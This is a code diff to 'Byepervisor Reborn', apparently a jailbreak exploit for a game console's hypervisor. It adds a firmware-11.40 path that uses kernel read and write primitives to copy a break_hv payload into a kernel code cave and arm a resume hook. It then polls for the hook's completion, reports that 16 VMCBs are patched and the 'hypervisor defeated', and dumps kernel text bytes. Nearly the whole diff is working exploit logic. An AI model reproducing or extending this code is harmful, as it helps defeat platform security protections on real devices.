@@ -9,6 +9,7 @@
 
 #include "kdlsym.h"
 #include "khook.h"
+#include "resume_hook_1140.h"
 #include "util.h"
 #include "paging.h"
 
@@ -262,8 +263,7 @@ int main(void)
 
 #else // !KHOOK_TEST
 
-  // Copy our payload that runs from startup_mp into kernel cave
-  kwrite(kdlsym(KERNEL_SYM_DATA_CAVE) + 0x1000, break_hv, break_hv_len);
+  int use_isolated = ((fw & 0xFFFF0000) == 0x11400000);
 
   // Make the physical region executable in guest page tables
   kernel_pmap   = kdlsym(KERNEL_SYM_PMAP_STORE);
@@ -307,45 +307,109 @@ int main(void)
     }
   }
 
-  // Install hook on startup_mp hypercall
-  printf("[+] Installing hook...\n");
-  if (kread64(cave + CAVE_STATE_OFF) != STATE_ARMED) {
-    int r = install_resume_hook(HOOK_CORE, cave, kernel_pm_cr3);
-    if (r) {
-      printf("[!] Failed to install hook (likely too large)\n");
-      notifyf("[ERROR] Byepervisor Reborn\nHook install failed :(");
-      return r;
+  if (use_isolated) {
+    // Install isolated resume hook (avoids POP_R8/STORE_RCX_R8/OR_RCX_EAX)
+    printf("[+] Installing resume hook (11.40 isolated path)...\n");
+    if (!resume_hook_1140_is_armed(cave)) {
+      int r = resume_hook_1140_arm(cave, kernel_pm_cr3, g_hv_base_pa,
+                                   break_hv, break_hv_len);
+      if (r) {
+        printf("[!] Failed to install resume hook: %d\n", r);
+        notifyf("[ERROR] Byepervisor Reborn\nResume hook install failed: %d", r);
+        return r;
+      }
+
+      printf("[+] Resume hook armed, enter rest mode and resume!\n");
+      notifyf("Byepervisor Reborn\nEnter rest mode and resume!\n");
+    } else {
+      printf("[+] Resume hook already armed (state survived)\n");
     }
 
-    printf("[+] Hook installed, enter sleep and resume!\n");
-    notifyf("Byepervisor Reborn\nEnter sleep and resume!\n");
+    // Poll for resume and hook trigger (AP payload writes MARK_ENTERED/MARK_DONE)
+    for (;;) {
+      pin_to_core(HOOK_CORE);
+
+      uint64_t entered = kread64(oracle);
+      uint64_t done = kread64(oracle + 24);
+      if (entered == RESUME_1140_MARK_ENTERED && done == RESUME_1140_MARK_DONE) {
+        uint64_t stash = cave + RESUME_1140_STASH_OFF;
+        uint64_t ap_error = kread64(stash);
+        uint64_t written = kread64(stash + 0x40);
+        uint64_t verified = kread64(stash + 0x48);
+
+        printf("[+] AP payload completed: error=%lu written=%lu verified=%lu\n",
+               (unsigned long)ap_error, (unsigned long)written,
+               (unsigned long)verified);
+
+        if (ap_error == 0 && written == 16 && verified == 16) {
+          notifyf("Byepervisor Reborn\nHypervisor defeated! 16/16 VMCBs patched");
+        } else {
+          notifyf("Byepervisor Reborn\nAP payload error=%lu w=%lu v=%lu",
+                  (unsigned long)ap_error, (unsigned long)written,
+                  (unsigned long)verified);
+        }
+
+        printf("[+] Cleaning up resume hook\n");
+        resume_hook_1140_cleanup(cave);
+
+        test_val = kread64(ktext(0));
+        test_val_bytes = (uint8_t *) &test_val;
+        notifyf("Byepervisor Reborn - Kernel .text first 8 bytes\n%02x %02x %02x %02x %02x %02x %02x %02x",
+        test_val_bytes[0], test_val_bytes[1], test_val_bytes[2], test_val_bytes[3],
+        test_val_bytes[4], test_val_bytes[5], test_val_bytes[6], test_val_bytes[7]);
+
+        return 0;
+      } else if (entered != 0) {
+        printf("[!] AP payload partial: entered=0x%lx done=0x%lx\n",
+               (unsigned long)entered, (unsigned long)done);
+      }
+
+      sceKernelSleep(5);
+    }
   } else {
-    printf("khook: hook already ARMED (state survived)\n");
-  }
+    // Copy our payload that runs from startup_mp into kernel cave
+    kwrite(kdlsym(KERNEL_SYM_DATA_CAVE) + 0x1000, break_hv, break_hv_len);
 
-  // Poll for resume and hook trigger
-  for (;;) {
-    pin_to_core(HOOK_CORE);
+    // Install hook on startup_mp hypercall
+    printf("[+] Installing hook...\n");
+    if (kread64(cave + CAVE_STATE_OFF) != STATE_ARMED) {
+      int r = install_resume_hook(HOOK_CORE, cave, kernel_pm_cr3);
+      if (r) {
+        printf("[!] Failed to install hook (likely too large)\n");
+        notifyf("[ERROR] Byepervisor Reborn\nHook install failed :(");
+        return r;
+      }
 
-    o = kread64(oracle);
-    if (o != 0) {
-      notifyf("Byepervisor Reborn\nWelcome back, hypervisor is defeated!\nCookie? 0x%lx", o);
-      
-      printf("[+] Uninstalling hook\n");
-      uninstall_hook(HOOK_CORE, cave);
-
-      test_val = kread64(ktext(0));
-      test_val_bytes = (uint8_t *) &test_val;
-      notifyf("Byepervisor Reborn - Kernel .text first 8 bytes\n%02x %02x %02x %02x %02x %02x %02x %02x", 
-      test_val_bytes[0], test_val_bytes[1], test_val_bytes[2], test_val_bytes[3], 
-      test_val_bytes[4], test_val_bytes[5], test_val_bytes[6], test_val_bytes[7]);
-
-      // TODO: Patch kernel and all that fun stuff, we don't feel like doing this so someone else can do it :)
-
-      return 0;
+      printf("[+] Hook installed, enter sleep and resume!\n");
+      notifyf("Byepervisor Reborn\nEnter sleep and resume!\n");
+    } else {
+      printf("khook: hook already ARMED (state survived)\n");
     }
 
-    sceKernelSleep(5);
+    // Poll for resume and hook trigger
+    for (;;) {
+      pin_to_core(HOOK_CORE);
+
+      o = kread64(oracle);
+      if (o != 0) {
+        notifyf("Byepervisor Reborn\nWelcome back, hypervisor is defeated!\nCookie? 0x%lx", o);
+
+        printf("[+] Uninstalling hook\n");
+        uninstall_hook(HOOK_CORE, cave);
+
+        test_val = kread64(ktext(0));
+        test_val_bytes = (uint8_t *) &test_val;
+        notifyf("Byepervisor Reborn - Kernel .text first 8 bytes\n%02x %02x %02x %02x %02x %02x %02x %02x",
+        test_val_bytes[0], test_val_bytes[1], test_val_bytes[2], test_val_bytes[3],
+        test_val_bytes[4], test_val_bytes[5], test_val_bytes[6], test_val_bytes[7]);
+
+        // TODO: Patch kernel and all that fun stuff, we don't feel like doing this so someone else can do it :)
+
+        return 0;
+      }
+
+      sceKernelSleep(5);
+    }
   }
   return 0;
 #endif
